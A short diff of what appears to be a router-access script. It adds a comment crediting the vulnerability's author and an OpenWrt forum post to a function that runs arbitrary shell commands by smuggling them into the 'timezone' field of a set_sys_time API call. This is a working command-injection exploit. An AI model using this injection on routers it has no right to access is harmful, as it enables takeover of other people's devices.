@@ -46,6 +46,10 @@ stok = gw.web_login()
 
 
 def exec_cmd(cmd, api = 'API/misystem/set_sys_time'):
+    ######
+    # vuln/exploit author: remittor
+    # publication: https://forum.openwrt.org/t/125008/132
+    ######
     resp = gw.api_request(api, { 'timezone': " ' ; " + cmd + " ; " })
     return resp
 
